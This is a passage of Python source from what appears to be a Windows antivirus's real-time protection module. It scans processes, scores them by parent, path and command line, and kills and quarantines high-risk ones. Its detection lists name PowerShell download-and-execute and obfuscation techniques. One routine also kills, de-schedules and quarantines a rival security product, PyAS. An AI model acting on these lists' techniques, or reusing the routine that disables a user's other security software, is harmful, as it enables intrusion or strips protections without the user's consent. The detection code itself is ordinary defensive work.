                    self._notify_killed("文件监控进程 dg_monitor")
                    self._start_file_monitor()
                return
            if not self._heartbeat_file or not os.path.exists(self._heartbeat_file):
                return
            mtime = os.path.getmtime(self._heartbeat_file)
            if now - mtime > 12 and now - self._last_monitor_restart > 20:
                self._last_monitor_restart = now
                # 终止旧监控线程（避免 join 当前线程）+ 杀旧进程并置空（允许重启）
                if (self._file_thread is not None and self._file_thread.is_alive()
                        and threading.current_thread() is not self._file_thread):
                    self._file_stop.set()
                    self._file_thread.join(timeout=2)
                elif self._file_thread is not None and                         threading.current_thread() is self._file_thread:
                    self._file_stop.set()
                if self._monitor_proc is not None:
                    try:
                        self._monitor_proc.kill()
                        self._monitor_proc.wait(timeout=2)
                    except Exception:
                        pass
                    self._monitor_proc = None
                self._log("文件监控心跳超时，自动重启")
                self._start_file_monitor()
        except Exception:
            pass

    def get_file_monitor_status(self):
        """获取文件监控状态。"""
        alive = self._monitor_proc is not None and self._monitor_proc.poll() is None
        guard_alive = self._guard_proc is not None and self._guard_proc.poll() is None
        return {
            "file_monitor_alive": alive,
            "monitor_dirs": len(self._monitor_dirs),
            "events_file": self._events_file,
            "guard_alive": guard_alive,
        }

    def _run(self):
        """后台线程主循环。"""
        while self.running and not self._stop_event.is_set():
            try:
                if not self.paused and self.config.get("enabled", True):
                    self._scan_once()
            except Exception as e:
                self._log(f"扫描异常: {e}")
            
            # 等待间隔，支持快速停止
            self._stop_event.wait(timeout=self.config.get("scan_interval", 5))
    
    def _scan_once(self):
        """执行一次进程扫描。"""
        self.scan_count += 1
        self.last_scan_time = datetime.now()
        
        try:
            processes = self._get_process_list()
        except Exception as e:
            self._log(f"获取进程列表失败: {e}")
            return
        
        for proc in processes:
            try:
                risks = self._analyze_process(proc)
                if risks:
                    self._handle_alert(proc, risks)
            except Exception as e:
                continue
    
    def _get_process_list(self):
        """获取进程列表，返回字典列表。"""
        processes = []
        try:
            # 使用wmic获取进程信息
            result = subprocess.run(
                ["wmic", "process", "get", "ProcessId,Name,ExecutablePath,CommandLine,ParentProcessId", "/format:csv"],
                capture_output=True, text=True, encoding="gbk", errors="ignore",
                timeout=10, creationflags=CREATE_NO_WINDOW
            )
            lines = result.stdout.strip().split("\n")
            if len(lines) > 1:
                # 解析CSV
                import csv
                import io
                reader = csv.DictReader(io.StringIO(result.stdout))
                for row in reader:
                    try:
                        pid = int(row.get("ProcessId", 0))
                        name = row.get("Name", "").strip()
                        path = row.get("ExecutablePath", "").strip()
                        cmd = row.get("CommandLine", "").strip()
                        ppid = 0
                        try:
                            ppid = int(row.get("ParentProcessId", 0) or 0)
                        except Exception:
                            pass
                        if name and pid > 0:
                            processes.append({
                                "pid": pid,
                                "name": name,
                                "path": path,
                                "cmd": cmd,
                                "parent_pid": ppid,
                            })
                    except Exception:
                        continue
        except Exception:
            pass
        
        # 如果wmic失败，用tasklist兜底
        if not processes:
            try:
                result = subprocess.run(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    capture_output=True, text=True, encoding="gbk", errors="ignore",
                    timeout=10, creationflags=CREATE_NO_WINDOW
                )
                for line in result.stdout.strip().split("\n"):
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        name = parts[0]
                        try:
                            pid = int(parts[1])
                            processes.append({"pid": pid, "name": name, "path": "", "cmd": "", "parent_pid": 0})
                        except Exception:
                            continue
            except Exception:
                pass
        
        # 4.4.0 行为链：构建父进程缓存供评分查询
        try:
            self._parent_cache = {p["pid"]: p for p in processes if p.get("pid")}
        except Exception:
            pass
        return processes
    
    def _behavior_chain_score(self, proc):
        """【4.4.0 行为链判定引擎 v1】不靠特征码，靠"谁启动了它+怎么启动+在哪跑"打分（0-100）。
        返回 (score, tags, reason)。与规则检测互补：规则抓"是什么"，行为链抓"干了什么"。"""
        score = 0
        tags = []
        name = (proc.get("name") or "").lower()
        path = (proc.get("path") or "").lower()
        cmd = (proc.get("cmd") or "").lower()
        parent_pid = proc.get("parent_pid") or 0

        # 白名单 / 系统关键进程直接 0 分
        sys_procs = ("system", "system idle process", "registry", "svchost.exe",
                     "lsass.exe", "csrss.exe", "winlogon.exe", "smss.exe",
                     "wininit.exe", "services.exe", "dwm.exe", "fontdrvhost.exe",
                     "sihost.exe", "taskhostw.exe", "runtimebroker.exe",
                     "searchui.exe", "explorer.exe")
        if name in sys_procs or name in [w.lower() for w in self.config.get("whitelist", [])]:
            return 0, [], "系统/白名单进程"

        # 1. 运行路径维度
        risky_paths = ("\\temp\\", "\\appdata\\local\\temp", "\\appdata\\roaming\\",
                       "\\downloads\\", "\\desktop\\", "\\programdata\\",
                       "\\users\\public\\")
        if path and name.endswith(".exe"):
            if any(p in path for p in risky_paths):
                score += 30
                tags.append("高风险目录运行")
            if path.startswith(("c:\\windows\\system32", "c:\\windows\\syswow64",
                                "c:\\program files")) and parent_pid in (0, 4):
                score -= 20
        elif not path:
            score += 10  # 无路径信息轻微加分，避免漏报

        # 2. 命令行维度
        hidden = (" -w hidden", " -windowstyle hidden", " /c ", "-enc ",
                  "encodedcommand", "frombase64string", "iex(", "downloadstring",
                  "invoke-webrequest", "invoke-expression", "mshta",
                  "regsvr32 /s", "wscript", "cscript", "-ep bypass",
                  "-executionpolicy bypass")
        for k in hidden:
            if k in cmd:
                score += 20
                tags.append("隐藏/混淆命令")
                break
        if "http://" in cmd or "https://" in cmd:
            score += 15
            tags.append("命令行联网")
        if name.endswith((".ps1", ".bat", ".cmd", ".vbs", ".js")) or "powershell" in name:
            score += 25
            tags.append("脚本类进程")
        if "\\\\" in cmd:
            score += 10  # UNC 网络路径

        # 3. 父进程维度
        parent = self._parent_cache.get(parent_pid)
        if parent:
            pname = (parent.get("name") or "").lower()
            ppath = (parent.get("path") or "").lower()
            pcmd = (parent.get("cmd") or "").lower()
            if pname in ("wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe",
                         "regsvr32.exe", "powershell.exe", "pwsh.exe", "cmd.exe"):
                score += 25
                tags.append("可疑父进程:" + pname)
            if ppath and any(p in ppath for p in risky_paths):
                score += 15
                tags.append("父进程来自高风险目录")
            if "downloadstring" in pcmd or "invoke-webrequest" in pcmd or "-enc" in pcmd:
                score += 20
                tags.append("父进程为远程下载器")
        else:
            if parent_pid not in (0, 4):
                score += 5

        score = max(0, min(100, score))
        reason = "行为链评分" + (("；" + "；".join(tags)) if tags else "")
        return score, tags, reason

    def _analyze_process(self, proc):
        """分析进程，返回风险列表。"""
        risks = []
        name = proc.get("name", "").lower()
        path = proc.get("path", "").lower()
        cmd = proc.get("cmd", "")
        
        # 白名单检查
        whitelist = self.config.get("whitelist", [])
        if name in [w.lower() for w in whitelist]:
            return risks
        
        # 系统关键进程跳过（避免误报）
        system_processes = [
            "system", "system idle process", "registry",
            "svchost.exe", "explorer.exe", "lsass.exe", "csrss.exe",
            "winlogon.exe", "smss.exe", "wininit.exe", "services.exe",
            "dwm.exe", "fontdrvhost.exe", "sihost.exe", "taskhostw.exe",
            "runtimebroker.exe", "searchui.exe", "shellappruntime.exe",
            "startmenuexperiencehost.exe", "textinputhost.exe",
        ]
        if name in system_processes:
            return risks
        
        # 1. 可疑进程名（伪装系统进程）
        if self.config.get("alert_on_suspicious_name", True):
            for pattern, desc in self._suspicious_name_patterns:
                if re.search(pattern, name, re.IGNORECASE):
                    risks.append({"level": "high", "type": "suspicious_name", "desc": desc})
                    break
        
        # 2. 可疑命令行
        if self.config.get("alert_on_suspicious_cmd", True) and cmd:
            cmd_lower = cmd.lower()
            for keyword, desc in self._suspicious_cmd_keywords:
                if keyword.lower() in cmd_lower:
                    risks.append({"level": "high", "type": "suspicious_cmd", "desc": f"{desc}: {cmd[:100]}"})
                    break
        
        # 3. 高风险路径（无签名的exe在Temp/AppData）
        if self.config.get("alert_on_risky_path", True) and path:
            for pattern in self._risky_path_keywords:
                if re.search(pattern, path, re.IGNORECASE):
                    # 只有exe才告警，避免误报
                    if name.endswith(".exe"):
                        risks.append({"level": "medium", "type": "risky_path", "desc": f"可执行文件位于高风险目录: {path}"})
                    break

        # 4. 【3.4.0 进程拦截】DG 自身文件保护：检测到写/删/覆盖 DG 程序文件的命令 → 高危
        if self.config.get("intercept_dg_tamper", True) and cmd:
            if self._is_dg_tamper_cmd(cmd):
                risks.append({"level": "high", "type": "dg_tamper",
                              "desc": f"疑似攻击 DG 安全自身（修改/删除程序文件）: {cmd[:120]}"})

        # 6. 【3.5.0 进程拦截】对抗性杀软：正在终止 DG 进程的软件（如 PyAS）
        if self.config.get("intercept_adversarial_av", True):
            if re.match(r"^pyas.*\.exe$", name, re.IGNORECASE):
                risks.append({"level": "high", "type": "adversarial_av",
                              "desc": "对抗性安全软件 PyAS（检测到其正在终止 DG 进程），已自动拦截"})

        # 5. 【3.4.0 进程拦截】组合高危：高风险目录可执行 + 强恶意命令特征
        if self.config.get("alert_on_risky_path", True) and path:
            low_path = path.lower()
            in_risky = any(re.search(p, low_path) for p in self._risky_path_keywords)
            if in_risky and name.endswith(".exe") and cmd:
                cmd_lower = cmd.lower()
                strong = any(k in cmd_lower for k in (
                    "-enc", "encodedcommand", "bypass", "downloadstring",
                    "iex(", "frombase64string", "mshta", "regsvr32",
                    "wscript", "cscript", " -w hidden", "invoke-webrequest",
                    "invoke-expression"))
                if strong:
                    risks.append({"level": "high", "type": "risky_combo",
                                  "desc": f"高风险目录可执行文件 + 恶意命令特征: {path}"})

        # 7. 【4.4.0 行为链判定引擎 v1】规则未命中时按行为链兜底；命中时按分数升级
        try:
            bscore, btags, breason = self._behavior_chain_score(proc)
            if bscore >= 80:
                risks.append({"level": "high", "type": "behavior_chain",
                              "desc": f"行为链高危（{bscore}分）: {breason}"})
            elif bscore >= 60:
                risks.append({"level": "medium", "type": "behavior_chain",
                              "desc": f"行为链可疑（{bscore}分）: {breason}"})
            elif bscore >= 45:
                for r in risks:
                    if r["level"] == "medium":
                        r["level"] = "high"
                        r["type"] = r["type"] + "+behavior_chain"
                        r["desc"] = r["desc"] + f" [行为链{bscore}分]"
                        break
        except Exception:
            pass
        return risks
    
    def _handle_alert(self, proc, risks):
        """处理告警。"""
        # 计算最高风险等级
        max_level = "low"
        for r in risks:
            if r["level"] == "high":
                max_level = "high"
                break
            elif r["level"] == "medium":
                max_level = "medium"
        
        # 生成唯一key
        key = f"{proc['name']}|{proc.get('path', '')}"
        
        # 检查冷却时间
        now = time.time()
        if key in self._alerted_processes:
            last_time = self._alerted_processes[key]
            if now - last_time < self._alert_cooldown:
                return  # 冷却期内不重复告警
        
        self._alerted_processes[key] = now
        self.alert_count += 1
        
        # 清理过期的告警记录
        expired = [k for k, v in self._alerted_processes.items() if now - v > self._alert_cooldown * 2]
        for k in expired:
            del self._alerted_processes[k]
        
        # 4.4.0 行为链引擎：附带评分并强制升级
        bscore, btags, breason = 0, [], ""
        try:
            bscore, btags, breason = self._behavior_chain_score(proc)
        except Exception:
            pass
        if bscore >= 80:
            max_level = "high"
        elif max_level == "low" and bscore >= 60:
            max_level = "medium"

        # 构建告警信息
        alert = {
            "type": "process_alert",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "pid": proc["pid"],
            "name": proc["name"],
            "path": proc.get("path", ""),
            "cmd": proc.get("cmd", ""),
            "risks": risks,
            "max_level": max_level,
            "behavior_score": bscore,
            "behavior_tags": btags,
            "behavior_reason": breason,
        }
        
        # 发送到主线程
        try:
            self.alert_queue.put(alert)
        except Exception:
            pass
        # 行为链判定入库（security_events）
        self._log_behavior_chain(proc, bscore, btags, breason, max_level)
        # 4.5.0：AI 行为分析接入高危告警——行为链分>=60 才调（节流每分钟≤1次，
        # 未配置 API 自动降级本地规则，绝不抛异常不影响主流程）
        if max_level == "high" and bscore >= 60 and not self.paused:
            try:
                _now_ai = time.time()
                if _now_ai - self._ai_analyze_at >= 60:
                    self._ai_analyze_at = _now_ai
                    _ev = [{
                        "event_type": "process_create",
                        "process_name": proc.get("name", ""),
                        "process_path": proc.get("path", ""),
                        "command_line": proc.get("cmd", "")[:500],
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }]
                    import threading as _th
                    def _ai_worker():
                        try:
                            import ai_behavior_analyzer as _aba
                            _ai = _aba.analyze_behavior(_ev, {"file_name": proc.get("name", "")})
                            self._log("AI行为分析[" + str(proc.get("name", "")) + "] 风险="
                                     + str(_ai.get("risk_level", ""))
                                     + " 动作=" + str(_ai.get("suggested_action", ""))
                                     + " 理由=" + str(_ai.get("reason", ""))[:120])
                        except Exception:
                            pass
                    _th.Thread(target=_ai_worker, daemon=True).start()
            except Exception:
                pass
        
        self._log(f"告警: {proc['name']} (PID:{proc['pid']}) - {max_level}")
        
        # 【3.4.0 进程拦截】高危进程自动拦截：树杀 + 隔离源文件 + 弹窗告知
        if max_level == "high" and self.config.get("process_intercept", True) and not self.paused:
            self._intercept_process(proc, risks)
        # 兼容旧配置：手动模式（仅结束进程，不隔离）
        elif max_level == "high" and self.config.get("auto_kill_high_risk", False):
            try:
                subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc["pid"])],
                             capture_output=True, timeout=5, creationflags=CREATE_NO_WINDOW)
                self._log(f"已自动结束进程: {proc['name']} (PID:{proc['pid']})")
            except Exception:
                pass
    
    def get_status(self):
        """获取当前状态。"""
        return {
            "running": self.running,
            "paused": self.paused,
            "enabled": self.config.get("enabled", True),
            "scan_count": self.scan_count,
            "alert_count": self.alert_count,
            "intercept_count": self.intercept_count,
            "last_scan_time": self.last_scan_time.strftime("%H:%M:%S") if self.last_scan_time else "未扫描",
            "scan_interval": self.config.get("scan_interval", 5),
            "file_monitor": self.get_file_monitor_status(),
        }
    
    def _log_behavior_chain(self, proc, score, tags, reason, level):
        """【4.4.0】行为链判定结果入库（security_events 表）。"""
        try:
            import sqlite3 as _sq
            db = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dg_data.db")
            conn = _sq.connect(db, timeout=5)
            try:
                conn.execute(
                    "INSERT INTO security_events (source, severity, file_path, sha256, details, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                    ("behavior_chain", level, proc.get("path", ""), "",
                     f"[{score}分][{'/'.join(tags) if tags else '无标签'}] {reason} pid={proc.get('pid')} name={proc.get('name')}",
                     int(time.time())))
                conn.commit()
            finally:
                conn.close()
        except Exception:
            pass

    def _log(self, msg):
        """记录日志。"""
        try:
            log_path = os.path.join(DATA_DIR, "rtp.log")
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
        except Exception:
            pass
    
    def _is_dg_tamper_cmd(self, cmd):
        """判断命令行是否在对 DG 自身程序做写/删/覆盖等攻击操作。
        排除 DG 自己的更新/切换/恢复进程，避免误拦自更新。"""
        try:
            low = cmd.lower()
            # DG 自身操作（更新/切换/恢复/清理）不算攻击
            own = ("dg_guard", "dg_monitor", "dg_quarantine", "scan_core",
                   "sandbox_runner", "dg_verdict", "dg版本切换器",
                   "restore_latest", "swap_backup", "versions\\", "versions/",
                   "popup_blocker", "cloud_lookup", "app_patrol")
            if any(x in low for x in own):
                return False
            # 写/删/覆盖动作
            write_verbs = ("copy", "xcopy", "move", "del ", "erase", "rename",
                           "overwrite", "replace", "attrib", "icacls", "cacls",
                           "takeown", "rd /s", "rmdir", "> ", ">> ")
            # DG 关键文件/目录
            targets = ("dg_monitor.exe", "dg_guard.exe", "dg_quarantine.exe",
                       "scan_core.exe", "sandbox_runner.exe", "dg_verdict.exe",
                       "main.py", "engine.py", "realtime_protection.py",
                       "database.py", "cloud_lookup.py", "app_patrol.py",
                       "popup_blocker.py", "paths.py", "desktopguard\\dgdata",
                       "desktopguard/dgdata", "\\desktopguard\\")
            hit_v = any(v in low for v in write_verbs)
            hit_t = any(t in low for t in targets)
            return hit_v and hit_t
        except Exception:
            return False

    def _isolate_source(self, path):
        """把攻击源可执行文件移入隔离区（改名防运行）。"""
        try:
            qdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "quarantine")
            os.makedirs(qdir, exist_ok=True)
            base = os.path.basename(path)
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            dst = os.path.join(qdir, f"{os.path.splitext(base)[0]}.intercepted_{stamp}.virus")
            shutil.move(path, dst)
            return dst
        except Exception:
            return ""

    def _intercept_process(self, proc, risks):
        """【3.4.0】拦截高危进程：结束进程树 + 隔离源可执行文件 + 发送拦截告警。"""
        pid = proc.get("pid", 0)
        name = proc.get("name", "")
        path = proc.get("path", "")
        try:
            self.intercept_count += 1
        except Exception:
            pass
        killed = False
        try:
            r = subprocess.run(["taskkill", "/F", "/T", "/PID", str(pid)],
                               capture_output=True, text=True, encoding="gbk",
                               errors="ignore", timeout=8, creationflags=CREATE_NO_WINDOW)
            killed = r.returncode == 0
        except Exception:
            pass
        # 【3.5.2】对抗性杀软深度清除：杀全部实例 + 删自保护计划任务 + 等解锁隔离源文件 + 验证
        extra = {}
        if any(r.get("type") == "adversarial_av" for r in risks):
            extra = self._deep_clean_adversarial(name, path)
        isolated = extra.get("isolated", "")
        extra_txt = ""
        if extra:
            extra_txt = (f"；深度清除：结束{extra.get('killed_count', 0)}个实例"
                         f"/计划任务{'已删' if extra.get('task_removed') else '未删'}"
                         f"/源文件{'已隔离' if isolated else '未隔离'}"
                         f"{'；进程可能复活（自保护强）' if extra.get('alive_after') else ''}")
        self._log(f"进程拦截: {name} (PID:{pid}) 已{'结束' if killed else '尝试结束'}"
                  f"（源文件交由主线程隔离）{extra_txt}")
        try:
            self.alert_queue.put({
                "type": "process_intercept",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "pid": pid, "name": name, "path": path,
                "cmd": proc.get("cmd", ""),
                "risks": risks, "max_level": "high",
                "killed": killed, "isolated": isolated,
                "adversarial_extra": extra,
            })
        except Exception:
            pass

    def _deep_clean_adversarial(self, name, path):
        """【3.5.2】对抗性杀软深度清除（如 PyAS）：
        1. 循环杀全部 ^pyas 实例（覆盖双进程互守/伪装名）
        2. 删除其自保护计划任务（PYAS_Security_ATS 拉起 PYAS.exe -hide）
        3. 等文件解锁后隔离源文件（正规入库，UI 可见可恢复）
        4. 验证是否仍存活
        """
        result = {"killed_count": 0, "task_removed": False, "isolated": "", "alive_after": False}
        try:
            # 1. 循环杀全部匹配实例（最多4轮，每轮间隔1秒等待复活窗口）
            for _ in range(4):
                try:
                    procs = [p for p in self._get_process_list()
                             if re.match(r"^pyas.*\.exe$", p.get("name", ""), re.IGNORECASE)]
                except Exception:
                    procs = []
                if not procs:
                    break
                for p in procs:
                    try:
                        subprocess.run(["taskkill", "/F", "/T", "/PID", str(p["pid"])],
                                       capture_output=True, timeout=6,
                                       creationflags=CREATE_NO_WINDOW)
                        result["killed_count"] += 1
                    except Exception:
                        pass
                time.sleep(1)
            # 2. 删除 PyAS 自保护计划任务（Anti-Tamper Service）
            for tn in (r"\PYAS_Security_ATS",):
                try:
                    subprocess.run(["schtasks", "/Change", "/TN", tn, "/Disable"],
                                   capture_output=True, timeout=6, creationflags=CREATE_NO_WINDOW)
                    subprocess.run(["schtasks", "/Delete", "/TN", tn, "/F"],
                                   capture_output=True, timeout=6, creationflags=CREATE_NO_WINDOW)
                    result["task_removed"] = True
                except Exception:
                    pass
            # 3. 等文件解锁后隔离源文件（正规数据库隔离）
            time.sleep(1)
            for fp in (path, r"F:\PYAS\PYAS.exe"):
                if fp and os.path.exists(fp):
                    try:
                        import database as _db
                        ok, _m = _db.quarantine_file(
                            fp, sha256="", threat_level="高危",
                            reason="DG 对抗性软件深度清除")
                        if ok:
                            result["isolated"] = fp
                            break
                    except Exception:
                        continue
            # 4. 验证
            try:
                result["alive_after"] = bool(
                    [p for p in self._get_process_list()
                     if re.match(r"^pyas.*\.exe$", p.get("name", ""), re.IGNORECASE)])
            except Exception:
                pass
        except Exception:
            pass
        return result

    def kill_process(self, pid):
        """结束指定进程。"""
        try:
            result = subprocess.run(
                ["taskkill", "/F", "/PID", str(pid)],
                capture_output=True, text=True, encoding="gbk", errors="ignore",
                timeout=5, creationflags=CREATE_NO_WINDOW
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def add_whitelist(self, process_name):
        """添加白名单。"""
        wl = self.config.get("whitelist", [])
        if process_name not in wl:
            wl.append(process_name)
            self.config["whitelist"] = wl
            self.save_config()
    
    def remove_whitelist(self, process_name):
        """移除白名单。"""
        wl = self.config.get("whitelist", [])
        if process_name in wl:
            wl.remove(process_name)
            self.config["whitelist"] = wl
            self.save_config()

